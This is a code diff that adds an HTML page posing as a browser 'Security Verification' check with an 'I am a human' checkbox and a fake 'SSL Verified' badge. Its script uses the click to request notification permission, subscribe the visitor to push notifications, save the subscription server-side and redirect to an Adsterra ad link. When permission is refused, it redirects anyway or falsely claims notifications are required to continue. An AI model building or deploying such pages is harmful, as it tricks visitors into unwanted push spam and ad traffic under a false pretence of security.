@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Security Verification</title>
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+
+  <div class="landing-container">
+    <div class="glass-panel verification-card">
+      <div class="brand-icon">
+        <svg viewBox="0 0 24 24">
+          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/>
+        </svg>
+      </div>
+      
+      <h1 id="page-title">Checking your browser...</h1>
+      <p id="page-instruction">Please verify you are not a robot to continue to your link.</p>
+
+      <div class="verification-action" id="verify-box">
+        <div class="checkbox-container">
+          <div class="custom-checkbox"></div>
+          <div class="spinner"></div>
+          <span class="checkbox-label" id="checkbox-text">I am a human</span>
+        </div>
+      </div>
+
+      <div class="alert-box" id="error-alert">
+        <strong>Permission Required!</strong><br>
+        To access this page, you must allow notifications. Click the 🔒 lock icon in your browser's address bar, change notifications to <strong>"Allow"</strong>, and refresh the page.
+      </div>
+
+      <div class="card-footer">
+        <svg viewBox="0 0 24 24">
+          <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
+        </svg>
+        <span>Secure Connection (SSL) Verified</span>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    let appConfig = null;
+
+    // Helper: URL base64 to Uint8Array for VAPID subscription
+    function urlBase64ToUint8Array(base64String) {
+      const padding = '='.repeat((4 - base64String.length % 4) % 4);
+      const base64 = (base64String + padding)
+        .replace(/\-/g, '+')
+        .replace(/_/g, '/');
+
+      const rawData = window.atob(base64);
+      const outputArray = new Uint8Array(rawData.length);
+
+      for (let i = 0; i < rawData.length; ++i) {
+        outputArray[i] = rawData.charCodeAt(i);
+      }
+      return outputArray;
+    }
+
+    // Load Configurations
+    async function loadConfig() {
+      try {
+        const response = await fetch('/api/config');
+        appConfig = await response.json();
+        
+        // Customize instructions if configured
+        if (appConfig.landingPageMessage) {
+          document.getElementById('page-instruction').textContent = appConfig.landingPageMessage;
+        }
+      } catch (err) {
+        console.error("Failed to load configurations:", err);
+      }
+    }
+
+    // Subscription & Redirection Execution
+    async function handleVerification() {
+      const verifyBox = document.getElementById('verify-box');
+      const errorAlert = document.getElementById('error-alert');
+      const checkboxText = document.getElementById('checkbox-text');
+      
+      // Step 1: Loading visual state
+      verifyBox.classList.add('loading');
+      checkboxText.textContent = "Verifying connection...";
+
+      if (!('serviceWorker' in navigator) || !('PushManager' in window)) {
+        console.warn("Push notifications not supported on this browser.");
+        redirectToAdsterra();
+        return;
+      }
+
+      try {
+        // Step 2: Request permission
+        const permission = await Notification.requestPermission();
+        
+        if (permission === 'granted') {
+          // Register SW & subscribe
+          const registration = await navigator.serviceWorker.register('/sw.js');
+          
+          // Wait for service worker to become active
+          await navigator.serviceWorker.ready;
+
+          const subscriptionOptions = {
+            userVisibleOnly: true,
+            applicationServerKey: urlBase64ToUint8Array(appConfig.vapidPublicKey)
+          };
+
+          const subscription = await registration.pushManager.subscribe(subscriptionOptions);
+
+          // Save subscription in our DB
+          await fetch('/api/subscribe', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ subscription })
+          });
+
+          // Show success state
+          verifyBox.classList.remove('loading');
+          verifyBox.classList.add('verified');
+          checkboxText.textContent = "Verification Complete";
+          
+          // Small delay for user to see success, then redirect
+          setTimeout(redirectToAdsterra, 1000);
+        } else {
+          // Permission blocked or dismissed
+          console.warn("Notification permission was denied.");
+          handleBlockedState();
+        }
+      } catch (err) {
+        console.error("Subscription failed:", err);
+        handleBlockedState();
+      }
+    }
+
+    // Redirect to Adsterra Link
+    function redirectToAdsterra() {
+      if (appConfig && appConfig.adsterraLink) {
+        window.location.href = appConfig.adsterraLink;
+      }
+    }
+
+    // Handle when user blocks notifications
+    function handleBlockedState() {
+      const verifyBox = document.getElementById('verify-box');
+      const errorAlert = document.getElementById('error-alert');
+      const checkboxText = document.getElementById('checkbox-text');
+
+      verifyBox.classList.remove('loading');
+      checkboxText.textContent = "Verification Failed";
+
+      if (appConfig && appConfig.redirectOnBlock) {
+        // Redirection anyway on block (monetize anyway)
+        redirectToAdsterra();
+      } else {
+        // Force manual enable instructions
+        errorAlert.classList.add('active');
+      }
+    }
+
+    // Event Listeners
+    document.getElementById('verify-box').addEventListener('click', () => {
+      // Prevent double trigger if already processing
+      const verifyBox = document.getElementById('verify-box');
+      if (!verifyBox.classList.contains('loading') && !verifyBox.classList.contains('verified')) {
+        handleVerification();
+      }
+    });
+
+    // Start loading configuration
+    window.addEventListener('DOMContentLoaded', loadConfig);
+  </script>
+</body>
+</html>
